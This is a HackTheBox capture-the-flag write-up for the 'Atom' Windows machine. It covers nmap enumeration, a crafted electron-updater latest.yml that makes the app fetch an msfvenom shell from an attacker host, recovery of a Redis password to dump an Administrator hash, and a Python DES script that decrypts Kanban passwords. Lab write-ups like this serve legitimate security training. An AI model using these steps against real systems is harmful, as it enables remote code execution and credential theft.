Title: Atom writeup HackTheBox - by DarkRider88
Date: 17/05/2021
Description: This is a easy level windows box in which we are exploiting a binary built on electron-builder which is vulnerable to update signature bypass, and this gives us remote code execution.
Image: /assets/images/atom.jpg
Level: Easy

# Enumeration

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 10:50 IST
Nmap scan report for 10.10.10.237
Host is up (0.24s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp open  msrpc        Microsoft Windows RPC
443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.14 seconds
```
Checking the smb port, there are few folders and one of them contains a pdf file.
On port 80, there is a application to download for windows.
The pdf says the app is build with electron-builder and it is using the electron-updater for pushing the regular updates.
The updates are being fetched from the client folders from SMB port.

Searching for exploit: https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html

Now we have to create a latest.yml file and put it into the client folder, which will help the updater to fetch our malicious payload.

## Getting shell

- create a exe file with msfvenom
- then create a latest.yml file like this

```
version: 2.0.0
path: http://10.10.16.5/r'shell.exe
sha512: Ih68rZYJKgdl3hlarnl+6kgqKig8Yh4l4KsYl80/FqCU6pxNH0JImoLiiAitO5UDMXkfdYVk5IwdbI0KYEkL3w==
```

## Root

run winPeas
Redis server is running
found a file: C:\program files\redis\redis.windows-service.conf

a password: kidvscat_yes_kidvscat

through this password we can connect with redis server

Install redis-tools on your computer 

connect with the server
```
redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscat
```

list keys
```
keys *
```
get user
```
get get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 

"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
10.10.10.237:6379> 

```

Search again the machine and we foudn a kanban portable pdf..
search for its exploit we found a script to decrypt its password

```py
import json
import base64
from des import * #python3 -m pip install des

try:
    hash = str(input("Enter the Hash : "))
    hash = base64.b64decode(hash.encode('utf-8'))
    key = DesKey(b"7ly6UznJ")
    print("Decrypted Password : " + key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
except:
    print("Wrong Hash")
```

